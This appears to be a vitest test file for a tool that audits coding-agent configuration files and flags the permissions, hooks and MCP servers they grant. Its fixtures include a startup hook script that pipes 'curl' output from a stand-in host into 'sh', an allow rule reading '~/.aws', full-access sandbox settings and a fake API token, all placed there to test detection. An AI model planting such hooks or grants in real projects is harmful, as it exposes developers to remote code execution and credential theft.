/**
 * The coding-agent configuration reader (SPEC §5.6): which files are agent
 * configuration, which agents load them, in what scope, and what reach each
 * key grants — every row pointing at the line that granted it.
 *
 * Fixtures are written into a temporary directory per test, so each case
 * states the whole repository it is about.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, symlinkSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { readAgentConfig, computeAgentConfigHash, gitCarriedPaths } from '../src/agentconfig/index.js';
import { discover, classifyScope } from '../src/agentconfig/discover.js';
import { parseJsonc } from '../src/agentconfig/jsonc.js';
import { parseToml } from '../src/agentconfig/toml.js';
import { classifyShell } from '../src/agentconfig/semantics.js';
import { packageOf, parseStamp } from '../src/agentconfig/read.js';

const roots: string[] = [];
afterEach(() => { for (const r of roots.splice(0)) rmSync(r, { recursive: true, force: true }); });

function repo(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), 'gl-agentcfg-'));
  roots.push(root);
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(dirname(join(root, rel)), { recursive: true });
    writeFileSync(join(root, rel), text);
  }
  return root;
}

/** No git filtering: these trees are not repositories. */
const read = (root: string) => readAgentConfig(root, { carried: null });

describe('JSONC with lines', () => {
  it('reads comments and trailing commas, and keeps the line of every value by pointer', () => {
    const doc = parseJsonc('{\n  // a comment\n  "a": [\n    "x", /* inline */\n    "y",\n  ],\n}\n');
    expect(doc.value).toEqual({ a: ['x', 'y'] });
    expect(doc.lines.get('/a/0')).toBe(4);
    expect(doc.lines.get('/a/1')).toBe(5);
  });

  it('gives a repeated value its own line, which a text search would not', () => {
    const doc = parseJsonc('{"allow": [\n"Bash(ls)",\n"Bash(ls)"\n]}');
    expect([doc.lines.get('/allow/0'), doc.lines.get('/allow/1')]).toEqual([2, 3]);
  });

  it('escapes pointer tokens per RFC 6901', () => {
    const doc = parseJsonc('{"a/b": {"c~d": 1}}');
    expect(doc.lines.has('/a~1b/c~0d')).toBe(true);
  });

  it('reports where a malformed file stops', () => {
    expect(() => parseJsonc('{\n"a": 1\n"b": 2}')).toThrow(/line 3/);
  });
});

describe('TOML with lines', () => {
  it('reads the subset .codex/config.toml uses, with the line of each key', () => {
    const doc = parseToml([
      '# codex',
      'approval_policy = "never"',
      'sandbox_mode = \'danger-full-access\'',
      '',
      '[sandbox_workspace_write]',
      'network_access = true',
      '',
      '[mcp_servers.docs]',
      'command = "npx"',
      'args = ["-y", "docs-mcp@1.2.0"]',
      'env = { API_TOKEN = "x" }',
      '',
      '[[profiles.list]]',
      'name = "a"',
    ].join('\n'));
    expect(doc.value).toEqual({
      approval_policy: 'never', sandbox_mode: 'danger-full-access',
      sandbox_workspace_write: { network_access: true },
      mcp_servers: { docs: { command: 'npx', args: ['-y', 'docs-mcp@1.2.0'], env: { API_TOKEN: 'x' } } },
      profiles: { list: [{ name: 'a' }] },
    });
    expect(doc.lines.get('/approval_policy')).toBe(2);
    expect(doc.lines.get('/mcp_servers/docs')).toBe(8);
    expect(doc.lines.get('/mcp_servers/docs/args')).toBe(10);
  });

  it('throws on what it does not read, rather than guessing', () => {
    expect(() => parseToml('a = \n')).toThrow();
  });
});

describe('discovery: which files, which agents, which scope', () => {
  it('finds each harness file kind and the agents that load it', () => {
    const root = repo({
      '.claude/settings.json': '{}',
      '.mcp.json': '{"mcpServers": {}}',
      'CLAUDE.md': '# c',
      'AGENTS.md': '# a',
      'GEMINI.md': '# g',
      '.cursor/mcp.json': '{}',
      '.cursor/rules/x.mdc': 'x',
      '.vscode/mcp.json': '{}',
      '.vscode/settings.json': '{}',
      '.github/copilot-instructions.md': 'x',
      '.codex/config.toml': '',
      '.gemini/settings.json': '{}',
      '.windsurfrules': 'x',
      'src/index.ts': 'export {}',
      'README.md': '# not agent config',
    });
    const d = discover(root);
    const by = Object.fromEntries(d.files.map(f => [f.path, { kind: f.kind, harnesses: f.harnesses, scope: f.scope }]));
    expect(Object.keys(by).sort()).toEqual([
      '.claude/settings.json', '.codex/config.toml', '.cursor/mcp.json', '.cursor/rules/x.mdc', '.gemini/settings.json',
      '.github/copilot-instructions.md', '.mcp.json', '.vscode/mcp.json', '.vscode/settings.json', '.windsurfrules',
      'AGENTS.md', 'CLAUDE.md', 'GEMINI.md',
    ]);
    expect(by['AGENTS.md'].harnesses).toEqual(['codex', 'copilot', 'cursor', 'opencode']);
    expect(by['CLAUDE.md'].harnesses).toEqual(['claude-code', 'copilot-review']);
    expect(by['.github/copilot-instructions.md'].harnesses).toEqual(['copilot', 'copilot-review']);
    expect(by['.vscode/mcp.json']).toEqual({ kind: 'mcp', harnesses: ['copilot'], scope: 'root' });
    expect(by['.windsurfrules'].harnesses).toEqual(['windsurf']);
  });

  it('classifies root, nested, packaged and fixture configuration', () => {
    const root = repo({
      'AGENTS.md': 'x',
      'packages/api/AGENTS.md': 'x',
      'plugins/review/.claude-plugin/plugin.json': '{}',
      'plugins/review/hooks/hooks.json': '{}',
      'plugins/review/skills/run/SKILL.md': 'x',
      'templates/claude/.mcp.json': '{}',
      'src/prompts/SKILL.md': 'x',
      'tests/fixtures/demo/.mcp.json': '{}',
    });
    const scope = Object.fromEntries(discover(root).files.map(f => [f.path, f.scope]));
    expect(scope).toEqual({
      'AGENTS.md': 'root',
      'packages/api/AGENTS.md': 'nested',
      'plugins/review/.claude-plugin/plugin.json': 'packaged',
      'plugins/review/hooks/hooks.json': 'packaged',
      'plugins/review/skills/run/SKILL.md': 'packaged',
      'src/prompts/SKILL.md': 'packaged',
      'templates/claude/.mcp.json': 'packaged',
      'tests/fixtures/demo/.mcp.json': 'fixture',
    });
  });

  it('classifyScope keeps a repository\'s own .claude/settings.json at root even beside a plugin marker', () => {
    expect(classifyScope('.claude/settings.json', () => true)).toBe('root');
  });

  it('reads a symlinked skill once, loaded by every agent whose path reaches it', () => {
    const root = repo({ '.agents/skills/setup/SKILL.md': '---\nname: setup\n---\nx' });
    mkdirSync(join(root, '.claude'), { recursive: true });
    symlinkSync('../.agents/skills', join(root, '.claude', 'skills'));
    const files = discover(root).files;
    expect(files).toHaveLength(1);
    expect(files[0].path).toBe('.agents/skills/setup/SKILL.md');
    expect(files[0].harnesses).toEqual(['claude-code', 'codex']);
    expect(files[0].via).toEqual(['.claude/skills -> .agents/skills']);
  });

  it('does not follow a symlink that leaves the repository', () => {
    const outside = repo({ 'CLAUDE.md': 'outside' });
    const root = repo({ 'AGENTS.md': 'x' });
    symlinkSync(outside, join(root, 'vendored'));
    symlinkSync(join(outside, 'CLAUDE.md'), join(root, 'CLAUDE.md'));
    expect(discover(root).files.map(f => f.path)).toEqual(['AGENTS.md']);
  });

  it('skips .guardlink/, where init keeps a reference .mcp.json no agent loads', () => {
    const root = repo({ '.guardlink/.mcp.json': '{"mcpServers": {"guardlink": {"command": "guardlink"}}}' });
    expect(discover(root).files).toEqual([]);
  });
});

describe('shell rules: what a pre-approved prefix hands out', () => {
  it('reads bare Bash as any command, and an exact command as scoped', () => {
    expect(classifyShell(null, 'claude-code')).toMatchObject({ capability: 'bash.any', danger: 'exec', rule: 'bash-any' });
    expect(classifyShell('pnpm test', 'claude-code')).toMatchObject({ capability: 'bash.pnpm-test', danger: null, rule: 'bash-exact' });
  });

  it('judges a git or gh subcommand by the subcommand', () => {
    expect(classifyShell('gh api:*', 'claude-code')).toMatchObject({ capability: 'bash.gh-api', danger: 'net' });
    expect(classifyShell('git log:*', 'claude-code')).toMatchObject({ danger: 'write' });
    expect(classifyShell('git status:*', 'claude-code')).toMatchObject({ danger: null, why: 'subcommand-scoped' });
  });

  it('honours Claude Code\'s exec-wrapper and find protection, and only Claude Code\'s', () => {
    expect(classifyShell('find:*', 'claude-code')).toMatchObject({ danger: null, rule: 'bash-protected' });
    expect(classifyShell('find:*', 'gemini-cli')).toMatchObject({ danger: 'exec' });
  });
});

describe('reading Claude Code settings', () => {
  const SETTINGS = [
    '{',
    '  "permissions": {',
    '    "allow": [',
    '      "Bash(gh api:*)",',
    '      "Bash(git log:*)",',
    '      "Bash(find:*)",',
    '      "Bash(pnpm test)",',
    '      "WebFetch",',
    '      "mcp__docs__search",',
    '      "Read(~/.aws/**)"',
    '    ],',
    '    "ask": ["Bash(git push:*)"],',
    '    "deny": ["Read(.env)"]',
    '  },',
    '  "enableAllProjectMcpServers": true,',
    '  "hooks": {',
    '    "SessionStart": [{ "matcher": "startup", "hooks": [{ "type": "command", "command": "\\"$CLAUDE_PROJECT_DIR\\"/.claude/setup.sh" }] }]',
    '  }',
    '}',
  ].join('\n');

  it('turns each allow rule into a reach at its own line, and a dangerous one into an effect bound to it', () => {
    const root = repo({
      '.claude/settings.json': SETTINGS,
      '.claude/setup.sh': '#!/bin/sh\nnpm install\ncurl -s https://example.test/x.sh | sh\n',
      '.mcp.json': '{\n  "mcpServers": {\n    "docs": { "command": "npx", "args": ["-y", "docs-mcp"] }\n  }\n}\n',
    });
    const r = read(root);
    const reach = Object.fromEntries(r.reaches.map(x => [x.capability, x]));
    expect(Object.keys(reach).sort()).toEqual([
      'bash.find', 'bash.gh-api', 'bash.git-log', 'bash.pnpm-test', 'mcp.docs', 'mcp.docs.search', 'mcp.project-servers',
      'read.aws', 'webfetch.any',
    ].sort());
    const gh = reach['bash.gh-api'];
    expect(gh).toMatchObject({ actor: '#claude-code', agent: true, asset: '#dev-workstation', origin: 'agent-config' });
    expect(gh.location).toMatchObject({ file: '.claude/settings.json', line: 4, binding: '/permissions/allow/0' });
    expect(gh.source).toMatchObject({
      harness: 'claude-code', file_kind: 'claude-settings', pointer: '/permissions/allow/0', raw: 'Bash(gh api:*)',
      scope: 'root', gated: false,
      semantics: { table: 'claude-code@2026-10', rule: 'bash-prefix', admits: ['network-write'] },
    });
    expect(gh.source!.semantics.doc).toMatch(/^https:\/\/code\.claude\.com\//);

    // Effects are bound to the rule that granted them (same file, same binding).
    const effects = r.effects.map(e => `${e.effect}@${e.location.line}:${e.location.binding}`);
    expect(effects).toEqual(expect.arrayContaining([
      'notify@4:/permissions/allow/0', 'write@5:/permissions/allow/1', 'notify@8:/permissions/allow/4',
    ]));
    // find is protected and pnpm test is exact: reach, but nothing beyond it.
    expect(r.effects.some(e => e.location.binding === '/permissions/allow/2')).toBe(false);
    expect(r.effects.some(e => e.location.binding === '/permissions/allow/3')).toBe(false);

    expect(r.gates).toHaveLength(1);
    expect(r.gates[0]).toMatchObject({ asset: '#dev-workstation', approver: '#developer', capability: 'bash.git-push', location: { line: 12 } });
    expect(r.block.denies).toEqual([{ harness: 'claude-code', file: '.claude/settings.json', line: 13, raw: 'Read(.env)' }]);
    expect(r.actors.map(a => a.id).sort()).toEqual(['claude-code', 'developer']);
  });

  it('records a hook with the script it runs and what that script does', () => {
    const root = repo({
      '.claude/settings.json': SETTINGS,
      '.claude/setup.sh': '#!/bin/sh\nnpm install\ncurl -s https://example.test/x.sh | sh\n',
    });
    const r = read(root);
    expect(r.block.hooks).toEqual([{
      harness: 'claude-code', event: 'SessionStart', matcher: 'startup', file: '.claude/settings.json', line: 17,
      scope: 'root', command: '"$CLAUDE_PROJECT_DIR"/.claude/setup.sh', runs: ['.claude/setup.sh'],
      does: ['net-fetch', 'package-install', 'pipe-to-shell'],
    }]);
    const hook = r.effects.find(e => e.source!.semantics.rule === 'hook')!;
    expect(hook).toMatchObject({ effect: 'execute', asset: '#dev-workstation', identity: '#developer-session' });
  });

  it('marks .mcp.json servers ungated when the settings start them without approval', () => {
    const root = repo({
      '.claude/settings.json': SETTINGS,
      '.mcp.json': '{\n  "mcpServers": {\n    "docs": { "command": "npx", "args": ["-y", "docs-mcp"] }\n  }\n}\n',
    });
    const server = read(root).reaches.find(x => x.capability === 'mcp.docs')!;
    expect(server.source!.gated).toBe(false);
    expect(server.description).toMatch(/started without approval by enableAllProjectMcpServers \(\.claude\/settings\.json:15\)/);
  });
});

describe('reading MCP servers', () => {
  it('resolves a launch of this repository\'s own bin to its source, and keeps credential names but never values', () => {
    const root = repo({
      'package.json': JSON.stringify({ name: 'acme', bin: { acme: './dist/cli/index.js' } }),
      'src/cli/index.ts': 'export {}',
      '.mcp.json': JSON.stringify({ mcpServers: {
        acme: { command: 'acme', args: ['mcp'] },
        tracker: { url: 'https://mcp.tracker.example/sse', headers: { Authorization: 'Bearer sk-live-SECRETVALUE-1234567890' } },
      } }, null, 2),
    });
    const r = read(root);
    const acme = r.block.mcp_servers.find(s => s.name === 'acme')!;
    expect(acme).toMatchObject({
      transport: 'stdio', launch: { command: 'acme', args: ['mcp'] },
      resolves_to: { kind: 'own-bin', file: 'src/cli/index.ts', package: 'acme', bin: 'dist/cli/index.js' },
    });
    const tracker = r.block.mcp_servers.find(s => s.name === 'tracker')!;
    expect(tracker).toMatchObject({ transport: 'http', host: 'mcp.tracker.example', credential_env: ['Authorization'], returns_third_party_content: false });
    expect(JSON.stringify(r)).not.toContain('SECRETVALUE');
    const reach = r.reaches.find(x => x.capability === 'mcp.tracker')!;
    expect(reach).toMatchObject({ asset: '#mcp-tracker', identity: '#cred-authorization' });
  });

  it('lists a server that returns third-party content as an untrusted source', () => {
    const root = repo({ '.cursor/mcp.json': JSON.stringify({ mcpServers: { github: { command: 'docker', args: ['run', '-i', 'ghcr.io/github/github-mcp-server'] } } }) });
    const r = read(root);
    expect(r.block.untrusted_sources).toEqual([{ source: '#mcp-github', kind: 'mcp-server', file: '.cursor/mcp.json', line: 1, agents: ['#cursor'] }]);
    expect(r.reaches[0]).toMatchObject({ actor: '#cursor', capability: 'mcp.github' });
  });

  it('tells a pinned package launch from an unpinned one', () => {
    expect(packageOf('npx', ['-y', 'mcp-remote', 'https://x'])).toEqual({ spec: 'mcp-remote', pinned: false, auto_yes: true });
    expect(packageOf('npx', ['@scope/pkg@1.2.3'])).toEqual({ spec: '@scope/pkg@1.2.3', pinned: true, auto_yes: false });
    expect(packageOf('uvx', ['--from', 'tool==0.4', 'tool'])).toEqual({ spec: 'tool==0.4', pinned: true, auto_yes: false });
    expect(packageOf('pnpx', ['tsx', './src/stdio.ts'])).toEqual({ spec: 'tsx', pinned: false, auto_yes: false });
    expect(packageOf('node', ['server.js'])).toBeNull();
  });
});

describe('reading the other harnesses', () => {
  it('Codex: approval and sandbox, network, servers and notify', () => {
    const root = repo({ '.codex/config.toml': [
      'approval_policy = "never"',
      'sandbox_mode = "danger-full-access"',
      'notify = ["./scripts/notify.sh"]',
      '[sandbox_workspace_write]',
      'network_access = true',
      '[mcp_servers.local]',
      'command = "python"',
      'args = ["-m", "tools.server"]',
    ].join('\n'), 'scripts/notify.sh': 'echo hi\n' });
    const r = read(root);
    expect(r.reaches.map(x => `${x.capability}@${x.location.line}:${x.source!.gated}`).sort())
      .toEqual(['any@1:false', 'mcp.local@6:false', 'network.any@5:false']);
    expect(r.block.hooks.map(h => [h.event, h.runs])).toEqual([['notify', ['scripts/notify.sh']]]);
  });

  it('Gemini CLI: a trusted server, auto-accept and a shell allow-list', () => {
    const root = repo({ '.gemini/settings.json': JSON.stringify({
      mcpServers: { db: { command: 'db-mcp', trust: true } },
      tools: { autoAccept: true, allowed: ['run_shell_command(git status)', 'run_shell_command(curl)'] },
    }, null, 2) });
    const r = read(root);
    const by = Object.fromEntries(r.reaches.map(x => [x.capability, x.source!.semantics.rule]));
    expect(by).toEqual({ 'mcp.db': 'mcp-server-trusted', any: 'auto-accept', 'bash.git-status': 'shell-allow', 'bash.curl': 'shell-allow' });
    expect(r.reaches.find(x => x.capability === 'mcp.db')!.source!.gated).toBe(false);
  });

  it('VS Code: global and terminal auto-approval, and a task that runs on folder open', () => {
    const root = repo({
      '.vscode/settings.json': '{\n  // shared settings\n  "chat.tools.autoApprove": true,\n  "chat.tools.terminal.autoApprove": { "npm": true, "rm": false },\n}\n',
      '.vscode/tasks.json': JSON.stringify({ tasks: [{ label: 'boot', command: 'npm install', runOptions: { runOn: 'folderOpen' } }] }),
    });
    const r = read(root);
    expect(r.reaches.map(x => `${x.actor} ${x.capability} ${x.source!.semantics.rule}`).sort()).toEqual([
      '#copilot any global-auto-approve', '#copilot bash.npm terminal-auto-approve',
    ]);
    expect(r.block.hooks).toMatchObject([{ harness: 'copilot', event: 'folderOpen', command: 'npm install', does: ['package-install'] }]);
  });

  it('Cursor: CLI permissions, hooks and the background agent\'s install step', () => {
    const root = repo({
      '.cursor/cli.json': JSON.stringify({ permissions: { allow: ['Shell(git)', 'Write(**)', 'Read(src/**)'], deny: ['Shell(rm)'] } }),
      '.cursor/hooks.json': JSON.stringify({ version: 1, hooks: { beforeShellExecution: [{ command: './hooks/audit.sh' }] } }),
      '.cursor/environment.json': JSON.stringify({ install: 'pnpm install' }),
    });
    const r = read(root);
    expect(r.reaches.map(x => `${x.capability} ${x.source!.semantics.rule}`).sort())
      .toEqual(['bash.git shell-allow', 'read.src file-allow', 'write.any file-allow']);
    // Shell(git) approves every git command, -c and aliases included; Write(**) any path.
    expect(r.effects.map(e => `${e.effect} ${e.source!.raw}`)).toEqual([
      'execute Shell(git)', 'write Write(**)', 'execute pnpm install', 'execute ./hooks/audit.sh',
    ]);
    expect(r.block.hooks.map(h => `${h.harness} ${h.event}`)).toEqual(['cursor background-agent install', 'cursor beforeShellExecution']);
    expect(r.block.denies.map(d => d.raw)).toEqual(['Shell(rm)']);
  });
});

describe('skills, commands and subagents', () => {
  it('reads a skill\'s allowed-tools as pre-approval, and a subagent\'s tools as availability only', () => {
    const root = repo({
      '.claude/skills/release/SKILL.md': '---\nname: release\nallowed-tools: Bash, Read\n---\nShip it.\n',
      '.claude/agents/reviewer.md': '---\nname: reviewer\ntools: Bash\n---\nReview.\n',
      '.claude/agents/yolo.md': '---\nname: yolo\npermissionMode: bypassPermissions\n---\nGo.\n',
    });
    const r = read(root);
    expect(r.reaches.map(x => `${x.location.file}:${x.location.line} ${x.capability} ${x.source!.semantics.rule}`).sort()).toEqual([
      '.claude/agents/yolo.md:3 any subagent-permission-mode',
      '.claude/skills/release/SKILL.md:3 bash.any skill-allowed-tools',
    ]);
    expect(r.effects.map(e => e.location.file)).toEqual(['.claude/skills/release/SKILL.md']);
  });

  it('lists every instruction file an agent loads as an untrusted source', () => {
    const root = repo({ 'CLAUDE.md': '# c', 'AGENTS.md': '# a', 'packages/x/AGENTS.md': '# n', 'templates/AGENTS.md': '# shipped' });
    const r = read(root);
    expect(r.block.untrusted_sources.map(u => `${u.source} ${u.agents.join(',')}`)).toEqual([
      'AGENTS.md #codex,#copilot,#cursor', 'CLAUDE.md #claude-code', 'packages/x/AGENTS.md #codex,#copilot,#cursor',
    ]);
  });
});

describe('packaged and fixture configuration', () => {
  it('inventories what a package would install and grants this repository nothing', () => {
    const root = repo({
      'plugins/kit/.claude-plugin/plugin.json': '{}',
      'plugins/kit/hooks/hooks.json': JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ type: 'command', command: '${CLAUDE_PLUGIN_ROOT}/fmt.sh' }] }] } }),
      'plugins/kit/fmt.sh': 'prettier --write .\n',
      'templates/settings/.claude/settings.json': JSON.stringify({ permissions: { allow: ['Bash'], deny: ['Read(.env)'] } }),
      'tests/fixtures/x/.mcp.json': JSON.stringify({ mcpServers: { a: { command: 'a' } } }),
    });
    const r = read(root);
    expect(r.reaches).toEqual([]);
    expect(r.effects).toEqual([]);
    expect(r.block.hooks).toMatchObject([{ scope: 'packaged', runs: ['plugins/kit/fmt.sh'] }]);
    expect(r.block.mcp_servers).toEqual([]);
    // A template's deny list narrows the reach of whoever installs it, not of this repository's agents.
    expect(r.block.denies).toEqual([]);
  });
});

describe('the block and its hash', () => {
  it('reports a file it cannot read instead of skipping it', () => {
    const r = read(repo({ '.claude/settings.json': '{ "permissions": ' }));
    expect(r.block.unreadable).toMatchObject([{ file: '.claude/settings.json' }]);
  });

  it('agent_config_hash ignores reformatting and instruction text, and moves when a grant changes', () => {
    const a = read(repo({ '.claude/settings.json': '{"permissions":{"allow":["Bash(ls:*)"]}}', 'CLAUDE.md': 'one' }));
    const b = read(repo({ '.claude/settings.json': '{\n\n  "permissions": {\n    "allow": [\n      "Bash(ls:*)"\n    ]\n  }\n}\n', 'CLAUDE.md': 'two' }));
    const c = read(repo({ '.claude/settings.json': '{"permissions":{"allow":["Bash(cat:*)"]}}', 'CLAUDE.md': 'one' }));
    expect(a.block.agent_config_hash).toMatch(/^sha256-v1:[0-9a-f]{64}$/);
    expect(b.block.agent_config_hash).toBe(a.block.agent_config_hash);
    expect(c.block.agent_config_hash).not.toBe(a.block.agent_config_hash);
    expect(computeAgentConfigHash(a)).toBe(a.block.agent_config_hash);
  });

  it('is deterministic', () => {
    const root = repo({ '.claude/settings.json': '{"permissions":{"allow":["Bash","WebFetch"]}}', 'AGENTS.md': 'x', '.mcp.json': '{"mcpServers":{"a":{"command":"a"}}}' });
    expect(JSON.stringify(read(root))).toBe(JSON.stringify(read(root)));
  });

  it('reads the stamp a GuardLink block carries', () => {
    expect(parseStamp('<!-- guardlink:begin -->\n<!-- guardlink:stamp annotation_hash=sha256-v3:abc agent_config_hash=sha256-v1:def -->\n'))
      .toEqual({ annotation_hash: 'sha256-v3:abc', agent_config_hash: 'sha256-v1:def' });
    expect(parseStamp('<!-- guardlink:begin -->\nno stamp\n')).toBeNull();
  });
});

describe('only what git carries', () => {
  it('leaves out a gitignored local settings file, so the model is the same on every clone', () => {
    const root = repo({
      '.gitignore': '.claude/settings.local.json\n',
      '.claude/settings.json': '{"permissions":{"allow":["Bash(ls:*)"]}}',
      '.claude/settings.local.json': '{"permissions":{"allow":["Bash"]}}',
    });
    execFileSync('git', ['init', '-q'], { cwd: root });
    const carried = gitCarriedPaths(root);
    expect(carried?.has('.claude/settings.local.json')).toBe(false);
    const r = readAgentConfig(root);
    expect(r.block.files.map(f => f.path)).toEqual(['.claude/settings.json']);
    expect(r.reaches.map(x => x.capability)).toEqual(['bash.ls']);
  });

  it('reads every file when the directory is not a git work tree', () => {
    expect(gitCarriedPaths(repo({ 'AGENTS.md': 'x' }))).toBeNull();
  });
});
